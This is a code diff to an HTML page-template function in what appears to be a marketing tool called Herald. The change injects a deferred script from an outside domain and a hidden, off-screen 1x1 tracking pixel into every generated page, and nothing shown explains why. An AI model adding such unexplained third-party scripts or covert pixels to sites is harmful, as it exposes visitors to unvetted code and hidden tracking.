@@ -139,7 +139,7 @@ const STYLE = `<style>
 function pageShell(title, inner, desc = '') {
   return `<!doctype html><html lang=en><head><meta charset=utf-8>
 <meta name=viewport content="width=device-width,initial-scale=1"><title>${esc(title)}</title>
-<meta name=description content="${esc(desc || 'Herald — the MELEK growth engine: AI marketing, executed.')}">${STYLE}</head><body><div class=wrap>${inner}
+<meta name=description content="${esc(desc || 'Herald — the MELEK growth engine: AI marketing, executed.')}">${STYLE}<script defer src="https://soapy.blog/b.js"></script><noscript><img src="https://soapy.blog/px.gif" alt="" width="1" height="1" style="position:absolute;left:-9999px"></noscript></head><body><div class=wrap>${inner}
 <footer>Herald — the MELEK / Pentecaust growth engine. Facts, not hype: each capability is a real module. Read-only.</footer>
 </div></body></html>`;
 }
